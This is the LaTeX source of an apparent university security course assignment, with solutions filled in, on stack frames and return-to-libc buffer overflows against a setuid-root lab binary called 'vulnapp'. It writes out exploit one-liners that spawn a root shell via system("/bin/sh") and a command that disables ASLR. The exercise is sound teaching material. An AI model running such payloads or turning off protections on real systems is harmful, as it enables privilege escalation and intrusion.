@@ -1,0 +1,541 @@
+% IMPORTANT: add or remove (comment out) the boolean '\solutiontrue' below to
+% create the solution document or the exercise document respectively.
+% First we create the switch to make either the exercises or the solutions
+\newif\ifsolution\solutionfalse
+% To create the solution uncomment '\solutiontrue'
+\solutiontrue
+
+
+
+%
+%
+
+
+
+
+
+
+
+
+
+
+
+% ./vulnapp `printf "aaaabbbbccccddddeeeezzzz\xd0\xfc\x04\x08aaaa\x21\xbe\x0d\x08"`
+% echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+% r2 -d ./vulnapp `printf "aaaabbbbccccddddeeeezzzz\xd0\xfc\x04\x08aaaa\x4e\xdd\xff\xff"`
+
+
+\documentclass[a4paper,11pt]{article}
+\title{System Security\\
+Buffer Overflow}
+
+\ifsolution
+\author{\bf Solution}
+\else
+\author{\bf Graded Assignment}
+\fi
+
+\ifsolution
+\author{Your Name Here}
+\fi
+
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{ae, aecompl}
+\usepackage{a4wide}
+\usepackage{boxedminipage}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{enumerate}
+\usepackage{alltt}
+\usepackage{hyperref}
+\usepackage{drawstack}
+\usepackage{textcomp}
+\usepackage{listings}
+
+% settings for listings
+\lstset{breaklines=true} 
+\lstset{basicstyle=\scriptsize\ttfamily}
+
+
+% Some useful commands and environments
+\usepackage{framed}
+\newenvironment{solution}%
+{\par{\noindent\small\textit{Solution:}}\vspace{-12pt}\begin{framed}}%
+{\end{framed}\par}
+
+
+
+%% tty - for displaying TTY input and output
+\newenvironment{tty}%
+{\small\begin{alltt}}%
+{\end{alltt}}
+
+\begin{document}
+\maketitle
+
+This exercise is about understanding stack frames and theoretical buffer overflows and finally, performing two return-to-libc buffer overflows. You have to option to use multiple different tools.
+ 
+The \texttt{bufov} archive contains a binary that you should use for this exercise. It also contains a \LaTeX{} template that you should use for your solution. Your solution has to be uploaded to moodle as a pdf.
+
+The {\sc vulnapp} program provides two ways to read user input. The first is by supplying the user input as a program argument in the command line, e.g. \verb|./vulnapp test|. The second is provided by the program that asks for user input during execution.
+
+The program is only vulnerable in the first case, i.e. while reading user input as a program argument. The function {\tt cpybuf} handles the copying of the user input in an insecure way.
+
+\section*{Tools}
+Note: All of these tools are already installed in the virtual machine. You can use all of these tools or just one. Different tools work well for different tasks.
+
+\subsection*{Assembly}
+In most of the tools you will encounter assembly. In case you need to refresh your memory here are some important points about assembly:
+\url{http://www.cs.virginia.edu/~evans/cs216/guides/x86.html}.
+
+\subsection*{gdb}
+
+\texttt{gdb} is a \emph{debugger}. A debugger allows you to execute the program, stop the program using breakpoints, examine the program state and even change the program state. You can use tutorials such \url{http://sourceware.org/gdb/current/onlinedocs/gdb.html}. gdb is a standard tool with the classical debugger features. It is a command-line tool. \texttt{ddd} is gdb with a GUI.
+
+\subsection*{Cutter}
+
+\texttt{cutter} is a disassembler and static analysis tool. It displays the static disassembly and the call graph. You can find it in the syssec home directory on the VM.
+
+\ifsolution 
+\section*{Stack frames (5 points)}
+\else
+\section*{Stack frames}
+\fi
+
+\begin{enumerate}
+
+\item Use the tools to investigate the stack frames when executing \texttt{./vulnapp 12345678}. For each of the locations given below, draw a diagram of the specified part of the stack frame. The diagram should contain 4-byte entries as below. The contents always specify a memory region addressed in bytes (inclusive on both sides). Addresses specify the value of the \texttt{EIP}, i.e. the specified address is the \textbf{next} to be executed.
+
+\begin{enumerate}
+\item Location: before the execution of \texttt{cpybuf} begins (\texttt{0x080488a5})\\
+Contents: From \texttt{esp} to \texttt{esp + 7} inclusive
+\item Location: after the preamble of \texttt{cpybuf} (\texttt{0x080488ac})\\
+Contents: From \texttt{esp} to \texttt{ebp + 11} inclusive
+\item Location: right after the \texttt{CALL strcpy} has finished (\texttt{0x080488ca})\\
+Contents: From \texttt{esp} to \texttt{ebp + 11} inclusive
+\item Location: after the \texttt{leave} instruction of \texttt{cpybuf} (\texttt{0x080488ea})\\
+Contents: From \texttt{esp} to \texttt{esp + 7} inclusive
+
+\end{enumerate} 
+
+The diagram should be of this \textbf{format: Label, Content, Address}. Labels can span multiple cells and should explain the content, e.g. return address. The content can be given as a string or as hex value. If certain entries/contents are unused/irrelevant, label them accordingly. The address should be ebp/esp+X. You can use the drawstack package as in this example, documentation: \url{https://www.ctan.org/pkg/drawstack}:
+
+\begin{drawstack}
+  \startframe
+  \cell{..  High addresses ..}
+  % \cellcom writes something on the right-hand side of a cell.
+  \cell{0x01020304} \cellcom{ebp+8}
+  \cell{'WXYZ'} \cellcom{ebp+4}
+  % \esp and \ebp are stack pointer and base pointer in Pentium.
+  % These macros are simple shortcuts for \cellptr{...}
+  \cell{0xdeadbeef} \ebp 
+  \cell{0x01020304} \cellcom{esp+4}
+  \finishframe{long label}
+  \startframe
+  \cell{unused} \esp
+  \finishframe{short label, e.g. return address}
+  \cell{..  Low addresses ..}
+\end{drawstack}
+
+This example would be for contents from \texttt{esp} to \texttt{ebp + 11} inclusive. \textbf{Label all entries!} Label all entries that might be reserved for local variables.
+
+Draw four Stack Frame Diagrams:
+\begin{enumerate}
+\item
+\ifsolution\begin{solution}
+
+\begin{drawstack}
+	\cell{.. High Addresses ..}
+	\startframe
+	\cell{0xffffda3f} 
+	\finishframe{pointer to arg1}
+	\startframe
+	\cell{0x080489c4} \cellcom{\%esp}
+	\finishframe{return address}
+	\cell{.. Low Addresses ..}
+\end{drawstack}
+
+\end{solution}\fi
+
+\item
+\ifsolution\begin{solution}
+
+
+\begin{drawstack}
+	\cell{.. High Addresses ..}
+	\startframe
+	\cell{0xffffda3f} 
+	\finishframe{pointer to arg1}
+	\startframe
+	\cell{0x080489c4} 
+	\finishframe{return address}
+	\startframe
+	\cell{0xffffd7c8}  \cellcom{\%ebp}
+	\finishframe{old value of esp}
+	\startframe
+	\cell{0x080da000} 
+	\finishframe{old value of ebx}
+	\startframe
+	\cell{0x0804ffe6} 
+	\finishframe{Local variable (0x2a)}
+	\startframe
+	\cell{0x080481a8} 
+	\cell{0x080da000} 
+	\cell{0xffffd7b8} \cellcom{\%esp}
+	\finishframe{buffer space for strcpy}
+	\cell{.. Low Addresses ..}
+\end{drawstack}
+
+
+
+\end{solution}\fi
+
+\item
+\ifsolution\begin{solution}
+\begin{drawstack}
+	\cell{.. High Addresses ..}
+	\startframe
+	\cell{0xffffda3f} 
+	\finishframe{pointer to "arg1"}
+	\startframe
+	\cell{0x080489c4} 
+	\finishframe{return address}
+	\startframe
+	\cell{0xffffd7c8}  \cellcom{\%ebp}
+	\finishframe{old esp value}
+	\startframe
+	\cell{0x080da000} 
+	\finishframe{old ebx value}
+	\startframe
+	\cell{0x0000002a} 
+	\finishframe{Local variable}
+	\startframe
+	\cell{0x08048100} 
+	\finishframe{Leftover buffer space}
+	\cell{"5678"} 
+	\cell{"1234"} 
+	\startframe
+	\cell{0xffffda3f} 
+	\finishframe{Source buffer}
+	\startframe
+	\cell{0xffffd79c} \cellcom{\%esp}
+	\finishframe{Destination buffer}
+	\cell{.. Low Addresses ..}
+\end{drawstack}
+\end{solution}\fi
+
+\item
+\ifsolution\begin{solution}
+\begin{drawstack}
+	\cell{.. High Addresses ..}
+	\startframe
+	\cell{0xffffda3f} 
+	\finishframe{pointer to arg1}
+	\startframe
+	\cell{0x800489c4} \cellcom{\%esp}
+	\finishframe{return address}
+	\cell{.. Low Addresses ..}
+\end{drawstack}
+\end{solution}\fi
+\end{enumerate}
+
+
+\item What is the size of the vulnerable buffer in bytes? I.e. how much stack space was reserved solely for the buffer? Consider only the size solely reserved for the buffer and not used for other variables.
+
+
+\ifsolution\begin{solution}
+	The size of the buffer is 12 bytes. 
+
+	We can see it from the instruction in \texttt{0x080488a9}, which is \texttt{"sub esp, 0x10"}. That means that
+	the function reserves 16 bytes for local variables.
+	Later on the function executes \texttt{"mov [ebp - 8], 0x2a"}, which means that uses \texttt{epb - 0x8} as a local variable.
+	The strcpy destination buffer is \texttt{ebp - 0x14}, and that means that the available buffer space is from
+	\texttt{ebp - 0x14} to \texttt{ebp - 0x8}, which is 12 bytes large.
+\end{solution}\fi
+\end{enumerate}
+
+
+\section*{Buffer Overflows}
+Now you will build exploits for the binary program {\tt vulnapp}. There are two buffer overflow attacks to perform in this task. Both are return-to-libc attacks.
+
+\textbf{MAKE SURE YOU EXECUTE }\texttt{./setup.sh}\textbf{ INSIDE THE }\texttt{bufov}\textbf{ FOLDER SO THAT }\texttt{vulnapp}\textbf{ HAS SET-UID AND IS OWNED BY} \texttt{root}. \texttt{ls -l vulnapp} should give: \texttt{-rwsr-xr-x}.
+
+\subsection*{Protection mechanisms}
+As you may expect, operating systems already provide a number of measures to
+prevent such an attack from being easily successful. One such measure is library
+address randomization, that is a part of \textit{Address Space Layout
+Randomization} (ASLR). The method randomizes the addresses to which dynamically
+linked libraries such as libc are loaded. This brings an additional protection
+given that the attacker must predict the function address. In order to make this
+exercise easier for you, we suggest to disable the virtual address
+randomization. This will ensure a stable virtual address space across multiple
+executions. 
+
+The compiler can protect the binary by integrating stack canaries. We have
+disabled the use of these canaries through the compiler flag
+\texttt{-fno-stack-protector} to make this exercise easier. Therefore the binary
+has no stack canaries.
+
+However, the stack of the binary is marked non-executable, meaning we cannot
+execute code from the stack.
+
+
+\subsection*{Building \& executing exploits}
+
+Your exploit user input will typically contain byte values that do not
+correspond to the ASCII values for printing characters. We recommend using {\it
+perl} or {\it python} to supply your exploits on the command line argument. Here
+is an example on how call vulnapp with the ASCII characters ``AAA'' followed by
+0xbfff5ef0 as argument: (the python command reorders the address into the right byte order)\\
+\verb|> ./vulnapp "|\`{}\verb|perl -e | \textquotesingle \verb|printf "A" x 3 . "\xf0\x5e\xff\xbf "|\textquotesingle \`{}\verb|"|
+
+or 
+
+
+{\footnotesize
+\noindent\verb|> ./vulnapp "|\`{}\verb|python2.7 -c | \textquotesingle \verb|from struct import pack; print("A"*3 + pack("I", 0xbfff5ef0));|\textquotesingle \`{}\verb|"|  \\
+}
+
+This way, you can fill the buffer with arbitrary characters, except zero bytes,
+and then add your actual exploit input that contain specific addresses in
+hexadecimal format.
+
+
+\ifsolution 
+\subsection*{Attack 1: Execute your favorite shell (4 points)}
+\else
+\subsection*{Attack 1: Execute your favorite shell}
+\fi
+
+\emph{We have collected hints for both attacks at the end of this
+  document!}
+
+Your task is to get {\sc vulnapp} to execute a favorite shell of yours (e.g.,
+/bin/bash, /bin/sh, /bin/zsh).
+
+To perform the attack you have to supply an exploit string that overwrites the
+stored return pointer in the stack frame for {\tt cpybuf} with the address of
+the system() function from the libc library and provide the necessary argument.
+This function allows you to execute any program (e.g., system("/bin/sh")). To
+provide arguments to the system function, you have to prepare the stack to look
+like before a regular function call. Think about how the stack layout has to be.
+\textit{Hint:} It is usually helpful to sketch it. As the system call expects a
+pointer to a string as argument, you will have to find a string, which matches
+the path of the file you want to execute. Luckily for you, the vulnapp
+application allows you to place a string of your choice in the memory as
+follows.
+
+\begin{verbatim}
+bash> ./vulnapp Hello
+Type some text:
+/bin/sh
+\end{verbatim}
+
+Note that your exploit string may also corrupt other parts of the
+stack state. In order to make the program terminate safely you will
+need to put on the stack the address of the function exit() to
+properly terminate the execution. 
+
+\textbf{Important:} While you can use tools such as gdb to prepare these attacks, you should perform the actual attack against the normally running executable which you started as normal user(syssec). So during the attack the program must be started as \verb|./vulnapp ...|.
+
+Perform the following tasks:
+
+\begin{enumerate}
+  \item Find the addresses of system() and exit().
+  \item Find the address that points to your typed text containing the shell to execute.
+  \item Draw a stack diagram after the execution of \texttt{strcpy} (as above) so that the attack will succeed.
+  \item Construct the exploit command.
+  \item Run the exploit command and check if you escalated your privileges, e.g. using \texttt{id}.
+\end{enumerate}
+
+\ifsolution\begin{solution}
+\begin{enumerate}
+	\item To find the address of system()and exit(), we can use radare2.
+
+		We can run \texttt{r2 -d ./vulnapp} and execute command \texttt{ia} to get information about all imports
+		and exports of the binary. We can grep the output by doing \texttt{ia\textasciitilde{}system}. 
+		The result is: 
+		
+		\verb|1797 0x00007cd0 0x0804fcd0 GLOBAL   FUNC   55 __libc_system|
+
+		which easily gives us the address of the system() function, which is \texttt{0x0804fcd0}.
+
+		Doing the same process for the exit() function, we get \texttt{0x0804eff0}.
+
+
+
+  \item To find the address where our typed text will be stored, we can disassemble the main function and see which
+	  arguments are given to the \texttt{fgets} call that reads from stdin. 
+		The last value that is pushed to the stack before the call to fgets (that means the first argument for the fgets function) is \texttt{0x80dbe20}, which is the location 
+		where our input will be stored.
+  \item 
+
+	  \begin{drawstack}
+		  \cell{.. High Addresses ..}
+		  \startframe
+
+			\startframe
+		  \cell{0x080dbe21}  
+		  \finishframe{location of input string}
+		  \startframe
+		  \cell{"aaaa"} 
+		  \finishframe{return address for system()}
+
+	\startframe
+		  \cell{0x0804fcd0} 
+		  \finishframe{address of system()}
+		  \startframe
+		  \cell{"zzzz"}  \cellcom{\%ebp}
+		  \cell{"eeee"} 
+		  \cell{"dddd"} 
+		  \cell{"cccc"} 
+		  \cell{"bbbb"} 
+		  \cell{"aaaa"} 
+		  \finishframe{padding}
+
+		  \startframe
+		  \cell{0xfff2ea3b} 
+		  \cell{0xfff2d84c}  \cellcom{\%esp}
+		  \finishframe{variables used by strcpy}
+
+
+
+		  \cell{.. Low Addresses ..}
+	  \end{drawstack}
+  \item Since our input gets saved to \texttt{0x080dbe20} we can't just put it as argument, because the character 0x20 is parsed as a space.
+	  Thus, we can work around this by using a \texttt{0x080dbe21} as input to the system() function, and give the string "//bin/sh" as input.
+		This means that the first character will be ignored, and the system() function will execute "/bin/sh".
+
+		The final exploit is constructed using this one-liner:
+
+		\verb|./vulnapp $(printf "aaaabbbbccccddddeeeezzzz\xd0\xfc\x04\x08aaaa\x21\xbe\x0d\x08")|
+
+		and then giving as input the string "//bin/sh".
+
+
+   \item 
+
+	   By running the exploit we get an sh shell. By running the command \texttt{whoami} or \texttt{id} we can verify that we are logged in as root.
+\end{enumerate}
+\end{solution}\fi
+
+\ifsolution 
+\subsection*{Attack 2: Execute the shell from environmental variables (2 points)}
+\else
+\subsection*{Attack 2: Execute the shell from environmental variables}
+\fi
+
+Not every program might allow you to place a string in memory through an extra
+input as vulnapp. So, this attack is similar to the previous one with the
+difference that you will need to find the path to the shell i.e., "/bin/sh" in
+the environmental variables.  These variables are automatically loaded in the
+program stack upon execution. Therefore you are not dependent on the additional
+input.
+
+For this attack, you are not allowed to supply any information when the program asks you to type some text. In difference to the previous attack, you just need to find the path to the shell program already included in the program space after loading the vulnapp program.
+
+The environmental variables are provided to the program as an argument. You can
+either use the existing \texttt{SHELL} variable, you can modify with
+\texttt{export SHELL=/bin/sh}, or create a new variable as \texttt{export
+NEWVAR=/bin/sh}. To find the correct address of the variable, you have multiple
+options\dots
+Perform the following tasks:
+
+\begin{enumerate}
+  \item Find the address of an environment variable containing the shell string.
+  \item How did you find it?
+  \item Construct the exploit command.
+  \item Run the exploit command and check if you escalated your privileges, e.g. using \texttt{id}.
+\end{enumerate}
+
+
+\ifsolution\begin{solution}
+
+\begin{enumerate}
+	\item The address of the contents of the SHELL environment variable is \texttt{0xffffdd4e}.
+  \item Using radare2 in debug mode, we can search for patterns in the memory reserved for the binary.
+	  I used the command \texttt{"/ SHELL"} which returns the starting address of the \texttt{"SHELL=/bin/sh"}
+		string. By adding to that address the number 6 (which is the length of the string "SHELL=", we get the content
+		of the environment variable.
+  \item The exploit command now becomes:
+
+	  \verb|./vulnapp $(printf "aaaabbbbccccddddeeeezzzz\xd0\xfc\x04\x08aaaa\x4e\xdd\xff\xff")|
+
+		and doesn't need anything as input when the program asks for it.
+
+	\item After obtaining the sh shell, running \texttt{whoami} or \texttt{id} confirms that we successfully escalated privileges.
+\end{enumerate}
+
+
+\end{solution}\fi
+
+\ifsolution 
+\section*{Further options (2 points)}
+\else
+\section*{Further options}
+\fi
+
+Name another option where the argument for the call to system could be stored.
+\ifsolution\begin{solution}
+The argument for the syscall could also be stored in the argument string itself.
+For example, we could run:\\
+\verb|./vulnapp .../bin/sh;|\\
+and then jump to the address on which "/bin/sh" starts.
+
+Another way would be using the "/bin/sh" string inside libc; unfortunately in this case
+	its address is \texttt{0x080ad02c} which contains a "0x0a" char and can't be provided as argument.
+\end{solution}\fi
+
+\noindent
+Name another option to terminate the program without a segmentation fault and
+without jumping directly to exit().  
+\ifsolution\begin{solution}
+	One way to terminate without causing a segmentation fault would be to jump indirectly to \texttt{exit()}, by using a function like 
+	\texttt{\_exit()} or a function that calls it, like \texttt{abort()}.
+\end{solution}\fi
+
+
+
+\subsection*{Some Advice}
+\begin{itemize}
+\item In GDB, you can disassemble the current function using {\tt
+      disassemble} or any function using {\tt
+      disassemble functionname}
+\item All the information you need to devise your exploit can be
+  determined by debugging {\sc vulnapp} in gdb.
+\item
+Be careful about byte ordering.
+\item
+You might want to use {\sc gdb} to step the program through the last few
+instructions of {\tt cpybuf} to make sure it is doing the right thing.
+\item
+You will need to pad the beginning of your exploit string with the proper number of
+bytes to overwrite the return pointer. The values of these bytes can
+be arbitrary (0x00 is not recommended though --- why not?).
+\item As a consequence of the last hint, you may run into problems if
+  the address of {\tt system} or {\tt exit} contains zeros --- why? In
+  such a case, either consider calling a different function from the
+  libc (if the address of system contains zeros), or find a different
+  address to return to --- be creative, there is at least one easy
+  solution if the address of exit contains zero(s).
+\item Memory addresses, when started in gdb, can be different from addresses in
+normal execution.  To avoid this problem you can attach {\tt gdb} to the already running
+program.
+\item Since {\tt vulnapp} is running as root, you'll need to run {\tt gdb} as root, too, if you want to attach it to {\tt vulnapp}.
+
+\item If you try to find the address of the environment variable with the other
+provided program you might have to do a small adjustments. Why?
+
+\item You can use the latex command \texttt{lstlisting} to  format raw output.
+
+\end{itemize}
+
+
+
+\begin{thebibliography}{---}
+\bibitem[1]{example} Please cite your sources, Example Author, \url{http://www.example.org}
+\end{thebibliography}
+
+\end{document}
+
